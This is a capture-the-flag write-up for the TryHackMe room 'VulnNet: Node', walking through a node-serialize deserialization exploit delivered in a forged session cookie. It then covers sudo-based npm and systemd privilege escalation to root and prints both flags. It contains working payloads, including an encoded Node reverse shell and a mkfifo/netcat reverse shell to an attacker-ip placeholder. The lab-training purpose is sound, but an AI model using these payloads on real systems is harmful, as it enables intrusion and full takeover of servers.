+++
author = "v801"
title = "VulnNet: Node"
date = "2022-08-11"
tags = [
    "appsec",
    "ctf",
    "javascript",
    "nmap",
    "node",
    "node-serialize",
    "reverse shell",
    "rce",
    "systemctl",
    "tcpdump",
    "tryhackme"
]
+++

After the previous breach, VulnNet Entertainment states it won't happen again. 
<!--more-->
Can you prove they're wrong?

## Intro

[VulnNet: Node](https://tryhackme.com/room/vulnnetnode) is a challenge room on [THM](http://tryhackme.com) that's described as:

>"VulnNet Entertainment has moved its infrastructure and now they're confident that no breach will happen again. You're tasked to prove otherwise and penetrate their network."

This post contains spoilers for this challange! :space_invader:

For this run I'm using a basic Ubuntu desktop with Firefox and some tools like nmap, base64, tcpdump, systemctl and netcat. :cat:

## Network Enumeration

We can start off with a `nmap` scan on the box with `nmap -A -T4 [target-ip]` to see if there's any common services running.

```none
🎃 nmap -A -T4 [target-ip]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-10 00:42 MDT
Nmap scan report for [target-ip]
Host is up (0.17s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
Nmap done: 1 IP address (1 host up) scanned in 46.60 seconds
```

The line below shows us that port `8080` is open and it's a Node.js Express HTTP server.

```none
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
```

It's common for HTTP servers to run on a port like this.  How about we take a look in the web browser at `http://[target-ip]:8080` to see what it's serving up?

## Web App Recon
![VulnNetNode1](https://user-images.githubusercontent.com/32247825/184016106-c889135e-59cd-4b6b-bcb8-78a529d5a14d.png)

Loading up the server address in the browser we're met with a typical blog page.  The page has a few interesting things to spot right away.  The left side of the page has a "Login Now" button with some text that says "Welcome, Guest".  I can't help but wonder what is this "Guest", actually?  

After taking a look around the console for any possible errors and the page source for any interesting code or links, we'll find that links don't lead anywhere. Besides some authors names, most of the page has nothing of interest.

One link does work, the "Login Now" button.

![VulnNetNode2](https://user-images.githubusercontent.com/32247825/184018157-cf8e0bf4-c1ce-49ee-84a1-6b9903450f1a.png)

Clicking the "Login Now" button brings us `http://[target-ip]:8080/login?`, which shows a standard login form.  Let's start digging into how this form operates.  When checking out the form HTML, we'll see that nothing in the page source shows anything too intesting.  Filling the login form with random dummy data and hitting submit does show us it's using client side input validation for the field with `type="email"`.  Since the browser handles this, it could be bypassed easily.  

We *could* start to run some fuzzing on the web directories and possible query params to dig deeper into this login form but I kept thinking about the "Welcome, Guest" text on the initial page.

Let's go back to the root URL.  Maybe there's something we overlooked?  Popping open Firefox Devtools, we can start checking the cookies under the storage > cookies tab.  

![VulnNetNode3](https://user-images.githubusercontent.com/32247825/184024759-443d9d55-c5e6-4585-a46a-1ae324d738ac.png)

Right away we can see there's a session cookie is being set.  :cookie:

Being unsure of what kind of hash it is, we can web search an online hash checker. The hash checker detected it as an encoded `base64` string.  Neat, let's decode it.

```none
🎃 echo eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ|base64 -d
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```
Decoding the hash gets us a JSON string.  

## Exploit

Now we know the cookie is being read as JSON from the Node server.  Let's try setting the `username` or `isGuest` values to something different and see what happens.  What if we try `"username":"Admin"` or `"isGuest":false`?

We'll have to encode the JSON string back to `base64` first before setting it as our session cookie value.  Here's our new JSON string we want to try:

```none
{"username":"Admin","isGuest":false,"encoding": "utf-8"}
```
Here it is with `base64` encode:

```none
🎃 echo '{"username":"Admin","isGuest":false,"encoding": "utf-8"}'|base64
e3VzZXJuYW1lOkFkbWluLGlzR3Vlc3Q6ZmFsc2UsZW5jb2Rpbmc6IHV0Zi04fQo=
```

With this new session cookie value, let's see how the site handles it once we alter the cookie and hit refresh.

![VulnNetNode4](https://user-images.githubusercontent.com/32247825/184030813-05c5ba5d-d575-4389-8560-b7cc6e879f4f.png)

It appears the "Guest" part of "Welcome, Guest" has changed in the HTML.  Changing the `isGuest` bool doesn't appear to have any effect on the root page or the `/login` page from earlier.

What I really want to know is, what happens if we send busted JSON formatting?

```none
{username":"Guest","isGuest":true,"encoding": "utf-8"}  
```

JSON does not like improper formatting in its structure and will throw an error if you break the formatting at all. I tried removing the first quotation mark `"`, encoding back to `base64` and sending the malformed JSON like we did last time.

```none
SyntaxError: Unexpected token u in JSON at position 1
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/www/VulnNet-Node/server.js:16:24
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
```

Well Hello World!  Loading the page with our broken JSON in the cookie got the server to throw an error.  Now it has exposed some internal server paths and that they're using a Node package called `node-serialize` trying to run `unserialize()`.

First thing we can do is check the web for any known `node-serialize` vulnerabilties.  Doing a quick web search reveals [CVE-2017-5941](https://nvd.nist.gov/vuln/detail/CVE-2017-5941) for `node-serialize 0.0.4`.

Further reading online can [show us how this exploit works](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).
>For successful exploitation, arbitrary code execution should occur when untrusted input is passed into unserialize() function.

Below we have a serialized wrapper function using [`child_process.exec()`](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback) to execute a ping command on the server.

```javascript
_$$ND_FUNC$$_function () {
  require('child_process').exec('ping -c2 [attacker-ip]', 
    function(error, stdout, stderr) { 
      console.log(stdout) 
    }
  );
}()
```

Now we can put the serialized wrapper function as the value for `username` in the JSON data.

```none
{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('ping -c2 [attacker-ip]', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":true,"encoding": "utf-8"}
```

Just like before, we need to `base64` encode the full JSON string.

```none
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncGluZyAtYzIgW2F0dGFja2VyLWlwXScsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSIsImlzR3Vlc3QiOnRydWUsImVuY29kaW5nIjogInV0Zi04In0=
```

With our new cookie payload set, all we have to do is use `tcpdump` on our network device to verify the ping came through.

```none
🎃 sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:41:46.948453 IP [target-ip] > [attacker-ip]: ICMP echo request, id 1208, seq 1, length 64
02:41:46.948477 IP [attacker-ip] > [target-ip]: ICMP echo reply, id 1208, seq 1, length 64
```

Awesome, we were able to verify that `ping` command got executed on the server.

Time to look up some reverse shells for Node! :cat:

After web searching for a little bit, I came across a super useful script called [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py).  With this we can generate encoded reverse shells for Node.

```none
🎃 python nodejsshell.py [attacker-ip] [port]
```

The output below is the encoded reverse shell payload.

```none
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,91,97,116,116,97,99,107,101,114,45,105,112,93,34,59,10,80,79,82,84,61,34,91,112,111,114,116,93,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Just like before, let's add to our serialized wrapper function.

```none
{"username":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,91,97,116,116,97,99,107,101,114,45,105,112,93,34,59,10,80,79,82,84,61,34,91,112,111,114,116,93,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()","isGuest":true,"encoding": "utf-8"}
```

Finally, we `base64` encode it.

```none
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsOTEsOTcsMTE2LDExNiw5Nyw5OSwxMDcsMTAxLDExNCw0NSwxMDUsMTEyLDkzLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDkxLDExMiwxMTEsMTE0LDExNiw5MywzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkiLCJpc0d1ZXN0Ijp0cnVlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9
```

All that's left is to start a `netcat` listener on our end.

```none
🎃 nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Now we can apply our new session cookie value and refresh.

```none
🎃 nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on [target-ip] 50630
Connected!
whoami
www
```

The reverse shell payload succeeded and we have shell access! :confetti_ball:

We can use a trick I learned in my last [challenge post](/posts/glitch) to gain full shell:

```none
/usr/bin/script -qc /bin/bash /dev/null
www@vulnnet-node:/home$
```

## Privilege Escalation
Now that we have a full shell, we can start looking around for our first flag, `user.txt`.  Unfortunately doing a `find` for the file did not return any results.  With that we can start looking for anything that might help us escalate our privledges.  First let's see if we have any `sudo` access.

```none
www@vulnnet-node:~/VulnNet-Node$ sudo -l
sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

Running `sudo -l` show us that we can run `/usr/bin/npm` as user `serv-manage` with no password.  Working with Node in the past, I know it's possible to have npm run commends via it's `package.json` scripts section.  Maybe we can get it to execute one?  Let's see.

Here we can create a new package.json file for npm to read from.  I've added a script called "privesc" that just spawns a new shell as user `serv-manage`.

```none
www@vulnnet-node:~$ echo '{"scripts": {"privesc": "/bin/sh"}}' > package.json
```

Let's see if it runs with the `sudo` command we have access to.

```none
www@vulnnet-node:~$ sudo -u serv-manage npm run privesc
sudo -u serv-manage npm run privesc

> @ privesc /home/www
> /bin/sh

$ whoami
serv-manage
```

Now we have access to home directory of user `serv-manage`.

```none
$ ls -lha
...
-rw-------  1 serv-manage serv-manage   38 Jan 24  2021 user.txt
...
```

```none
$ cat user.txt
cat user.txt
THM{064640a2f880ce9ed7a54886f1bde821}
```

The first flag has been discovered! :space_invader:

## Root Privilege Escalation

We still have one more flag to find: `root.txt`.

As user `serv-manage` we can check `sudo -l` again to see if we have access to anything.

```none
$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

Interesting.  As user `serv-manage` we have `sudo` access to what looks like a service called `vulnnet-auto.timer` and the ability to use `daemon-reload` from `systemctl`.  What is `daemon-reload`?  Let's check the `systemctl` man page.

```none
daemon-reload
    Reload the systemd manager configuration. This will rerun all generators (see
    systemd.generator(7)), reload all unit files, and recreate the entire dependency tree. While
    the daemon is being reloaded, all sockets systemd listens on behalf of user configuration
    will stay accessible.

    This command should not be confused with the reload command.
```

The man page for `systemctl` shows us it will reload all service files for us.  Now let's see if we can find anything useful in the service files.  A `locate vulnnet-job.service` command here works great for this but a quick web search will also tell us the serivce files for `systemctl` live in `/etc/systemd/system/`.  

Inside we can spot the timer file and also a service file, both of which we have write permissions.

```none
serv-manage@vulnnet-node:~$ ls -lha /etc/systemd/system/
...
-rw-rw-r--  1 root serv-manage  167 Jan 24  2021 vulnnet-auto.timer
-rw-rw-r--  1 root serv-manage  197 Jan 24  2021 vulnnet-job.service
```

Let's display what's inside each file.

```none
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

```none
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

Here it appears the file called `vulnnet-auto.timer` runs the `vulnnet-job.service` file on boot in addition to once every 30mins.  The `vulnnet-job.service` service just runs `/bin/df`.  `df` displays the amount of disk space available on the file system.  Are you thinking what I'm thinking?  Maybe we can change that to a shell script for our privesc.

The TTY bugs out when we try to use `vi` or `nano` so we'll have to use echo for our new service file.

We'll start with changing the `vulnnet-auto.timer` file to run every 1 minute incase we don't want to wait around to see if it works.

```none
echo '[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
OnCalendar=*:0/1
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target' > /etc/systemd/system/vulnnet-auto.timer
```

```none
echo '[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
Type=forking
ExecStart=/tmp/shell

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/vulnnet-job.service
```

Use echo to write into a reverse shell script.  
The `-e` flag allows us to use new line `\n` characters.

```none
echo -e '#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker-ip] [port] >/tmp/f' > /tmp/shell
```

Quick `cat` check to make sure it looks ok.

```none
serv-manage@vulnnet-node:~$ cat /tmp/shell
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker-ip] [port] >/tmp/f
```

Just have to make it executable.

```none
chmod +x /tmp/shell
```

Run a new listener on our end with `netcat`.

```none
🎃 nc -lvnp 9999
Listening on 0.0.0.0 9999
```

With our listener open and our modified service files in-place, we can start the `vulnnet-auto.timer` service which will run `vulnnet-job.service` on boot and every 1 minute.  

```none
serv-manage@vulnnet-node:~$ sudo -u root systemctl stop vulnnet-auto.timer
serv-manage@vulnnet-node:~$ sudo -u root systemctl daemon-reload
serv-manage@vulnnet-node:~$ sudo -u root systemctl start vulnnet-auto.timer
```

```none
🎃 nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.246.192 55366
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Nice!  Now we've got root!

```none
# ls -la /root
...
-rw-------  1 root root   38 Jan 24  2021 root.txt
...
```

```none
# cat /root/root.txt
THM{abea728f211b105a608a720a37adabf9}
```
There's the final flag! :space_invader::space_invader::space_invader:

## Outro

Holy hell, that was a lot of fun!  I'm really glad I got to dive into learning more about systemctl services.  Thanks to `SkyWaves` for making this challenge.

## Mitigation

Keep Node.js packages up to date or replace insecure ones.  
Don't allow the server to read in user input, like from easily modifiable JSON from cookies.
